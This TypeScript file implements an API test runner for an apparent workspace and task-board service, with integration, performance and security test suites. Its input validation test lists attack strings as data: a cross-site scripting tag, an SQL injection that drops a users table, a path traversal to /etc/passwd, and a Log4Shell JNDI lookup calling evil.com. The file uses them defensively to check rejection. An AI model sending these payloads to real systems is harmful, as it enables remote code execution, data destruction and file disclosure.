/**
 * API Test Runner - Test runner for API tests
 * FR-001: API-First Design - API test runner implementation
 */

import { createApiTestUtils } from '../utils/apiTestUtils';
import { apiTestConfig } from '../config/apiTestConfig';

export interface TestResult {
  name: string;
  status: 'passed' | 'failed' | 'skipped' | 'pending';
  duration: number;
  error?: string;
  retries: number;
  metadata?: Record<string, any>;
}

export interface TestSuite {
  name: string;
  tests: TestResult[];
  status: 'passed' | 'failed' | 'skipped';
  duration: number;
  error?: string;
}

export interface TestReport {
  suites: TestSuite[];
  summary: {
    total: number;
    passed: number;
    failed: number;
    skipped: number;
    pending: number;
    duration: number;
    successRate: number;
  };
  metadata: {
    environment: string;
    timestamp: string;
    version: string;
    config: any;
  };
}

export class ApiTestRunner {
  private static instance: ApiTestRunner;
  private testUtils: ReturnType<typeof createApiTestUtils>;
  private config: ReturnType<typeof apiTestConfig.getConfig>;
  private results: TestResult[] = [];
  private suites: TestSuite[] = [];

  constructor() {
    this.config = apiTestConfig.getConfig();
    this.testUtils = createApiTestUtils({
      baseURL: this.config.baseURL,
      timeout: this.config.timeout,
      retries: this.config.retries,
      retryDelay: this.config.retryDelay,
    });
  }

  public static getInstance(): ApiTestRunner {
    if (!ApiTestRunner.instance) {
      ApiTestRunner.instance = new ApiTestRunner();
    }
    return ApiTestRunner.instance;
  }

  public async runTest(
    name: string,
    testFn: () => Promise<void>,
    options: {
      retries?: number;
      timeout?: number;
      skip?: boolean;
      metadata?: Record<string, any>;
    } = {}
  ): Promise<TestResult> {
    const {
      retries = this.config.retries,
      timeout = this.config.timeout,
      skip = false,
      metadata = {},
    } = options;

    if (skip) {
      return {
        name,
        status: 'skipped',
        duration: 0,
        retries: 0,
        metadata,
      };
    }

    const startTime = Date.now();
    let lastError: Error | undefined;
    let attempt = 0;

    while (attempt <= retries) {
      try {
        await Promise.race([
          testFn(),
          new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Test timeout')), timeout)
          ),
        ]);

        const duration = Date.now() - startTime;
        const result: TestResult = {
          name,
          status: 'passed',
          duration,
          retries: attempt,
          metadata,
        };

        this.results.push(result);
        return result;
      } catch (error) {
        lastError = error as Error;
        attempt++;

        if (attempt <= retries) {
          await new Promise(resolve => setTimeout(resolve, this.config.retryDelay));
        }
      }
    }

    const duration = Date.now() - startTime;
    const result: TestResult = {
      name,
      status: 'failed',
      duration,
      error: lastError?.message,
      retries: attempt - 1,
      metadata,
    };

    this.results.push(result);
    return result;
  }

  public async runTestSuite(
    name: string,
    tests: Array<{
      name: string;
      test: () => Promise<void>;
      options?: {
        retries?: number;
        timeout?: number;
        skip?: boolean;
        metadata?: Record<string, any>;
      };
    }>,
    options: {
      parallel?: boolean;
      timeout?: number;
      skip?: boolean;
    } = {}
  ): Promise<TestSuite> {
    const { parallel = false, timeout = this.config.timeout, skip = false } = options;

    if (skip) {
      return {
        name,
        tests: [],
        status: 'skipped',
        duration: 0,
      };
    }

    const startTime = Date.now();
    const testResults: TestResult[] = [];

    if (parallel) {
      const promises = tests.map(({ name: testName, test, options: testOptions }) =>
        this.runTest(testName, test, testOptions)
      );
      const results = await Promise.all(promises);
      testResults.push(...results);
    } else {
      for (const { name: testName, test, options: testOptions } of tests) {
        const result = await this.runTest(testName, test, testOptions);
        testResults.push(result);
      }
    }

    const duration = Date.now() - startTime;
    const status = testResults.every(r => r.status === 'passed') ? 'passed' : 'failed';
    const error = testResults.find(r => r.status === 'failed')?.error;

    const suite: TestSuite = {
      name,
      tests: testResults,
      status,
      duration,
      error,
    };

    this.suites.push(suite);
    return suite;
  }

  public async runAllTests(): Promise<TestReport> {
    const startTime = Date.now();
    this.results = [];
    this.suites = [];

    try {
      // Run contract tests
      if (this.config.isContractTestEnabled()) {
        await this.runContractTests();
      }

      // Run integration tests
      if (this.config.isIntegrationTestEnabled()) {
        await this.runIntegrationTests();
      }

      // Run performance tests
      if (this.config.isPerformanceTestEnabled()) {
        await this.runPerformanceTests();
      }

      // Run security tests
      if (this.config.isSecurityTestEnabled()) {
        await this.runSecurityTests();
      }

      // Cleanup test data
      if (this.config.cleanup.autoCleanup) {
        await this.testUtils.cleanupTestData();
      }
    } catch (error) {
      console.error('Test runner error:', error);
    }

    const duration = Date.now() - startTime;
    return this.generateReport(duration);
  }

  private async runContractTests(): Promise<void> {
    await this.runTestSuite('Contract Tests', [
      {
        name: 'API Contract Validation',
        test: async () => {
          // Contract tests are implemented in separate files
          // This is a placeholder for the test suite
        },
      },
    ]);
  }

  private async runIntegrationTests(): Promise<void> {
    await this.runTestSuite('Integration Tests', [
      {
        name: 'Authentication Flow',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          expect(user).toBeDefined();
          expect(user.tokens).toBeDefined();
        },
      },
      {
        name: 'Workspace Management',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const workspace = await this.testUtils.createTestWorkspace(user);
          expect(workspace).toBeDefined();
          expect(workspace.id).toBeDefined();
        },
      },
      {
        name: 'Board Management',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const workspace = await this.testUtils.createTestWorkspace(user);
          const board = await this.testUtils.createTestBoard(user, workspace.id);
          expect(board).toBeDefined();
          expect(board.id).toBeDefined();
        },
      },
      {
        name: 'Task Management',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const workspace = await this.testUtils.createTestWorkspace(user);
          const board = await this.testUtils.createTestBoard(user, workspace.id);
          const task = await this.testUtils.createTestTask(user, board.id);
          expect(task).toBeDefined();
          expect(task.id).toBeDefined();
        },
      },
    ]);
  }

  private async runPerformanceTests(): Promise<void> {
    await this.runTestSuite('Performance Tests', [
      {
        name: 'Response Time Test',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const { duration } = await this.testUtils.measureResponseTime(async () => {
            await this.testUtils.createTestWorkspace(user);
          });
          expect(duration).toBeLessThan(this.config.performance.responseTimeThreshold);
        },
      },
      {
        name: 'Throughput Test',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const startTime = Date.now();
          const promises = Array.from({ length: 10 }, () =>
            this.testUtils.createTestWorkspace(user)
          );
          await Promise.all(promises);
          const duration = Date.now() - startTime;
          const throughput = (10 / duration) * 1000; // requests per second
          expect(throughput).toBeGreaterThan(this.config.performance.throughputThreshold);
        },
      },
      {
        name: 'Memory Usage Test',
        test: async () => {
          const user = await this.testUtils.createTestUser();
          const { memoryUsage } = await this.testUtils.measureMemoryUsage(async () => {
            await this.testUtils.createTestWorkspace(user);
          });
          expect(memoryUsage).toBeLessThan(this.config.performance.memoryUsageThreshold);
        },
      },
    ]);
  }

  private async runSecurityTests(): Promise<void> {
    await this.runTestSuite('Security Tests', [
      {
        name: 'Input Validation Test',
        test: async () => {
          // Test malicious input handling
          const maliciousInputs = [
            '<script>alert("XSS")</script>',
            "'; DROP TABLE users; --",
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
          ];

          for (const input of maliciousInputs) {
            try {
              await this.testUtils.createTestUser(input);
              // Should not reach here
              expect(true).toBe(false);
            } catch (error) {
              // Expected to fail
              expect(error).toBeDefined();
            }
          }
        },
      },
      {
        name: 'Authentication Test',
        test: async () => {
          // Test invalid credentials
          try {
            await this.testUtils.loginTestUser('invalid@example.com', 'wrongpassword');
            expect(true).toBe(false);
          } catch (error) {
            expect(error).toBeDefined();
          }
        },
      },
      {
        name: 'Authorization Test',
        test: async () => {
          // Test unauthorized access
          const user1 = await this.testUtils.createTestUser();
          const user2 = await this.testUtils.createTestUser();
          const workspace = await this.testUtils.createTestWorkspace(user1);

          // User2 should not be able to access user1's workspace
          try {
            this.testUtils.apiClient.setTokens(user2.tokens!.accessToken, user2.tokens!.refreshToken);
            await this.testUtils.apiService.workspaces.get(workspace.id);
            expect(true).toBe(false);
          } catch (error) {
            expect(error).toBeDefined();
          }
        },
      },
    ]);
  }

  private generateReport(duration: number): TestReport {
    const total = this.results.length;
    const passed = this.results.filter(r => r.status === 'passed').length;
    const failed = this.results.filter(r => r.status === 'failed').length;
    const skipped = this.results.filter(r => r.status === 'skipped').length;
    const pending = this.results.filter(r => r.status === 'pending').length;
    const successRate = total > 0 ? (passed / total) * 100 : 0;

    return {
      suites: this.suites,
      summary: {
        total,
        passed,
        failed,
        skipped,
        pending,
        duration,
        successRate,
      },
      metadata: {
        environment: this.config.getTestEnvironment(),
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        config: this.config,
      },
    };
  }

  public getResults(): TestResult[] {
    return [...this.results];
  }

  public getSuites(): TestSuite[] {
    return [...this.suites];
  }

  public clearResults(): void {
    this.results = [];
    this.suites = [];
  }

  public async cleanup(): Promise<void> {
    await this.testUtils.cleanupTestData();
    this.clearResults();
  }
}

// Export singleton instance
export const apiTestRunner = ApiTestRunner.getInstance();
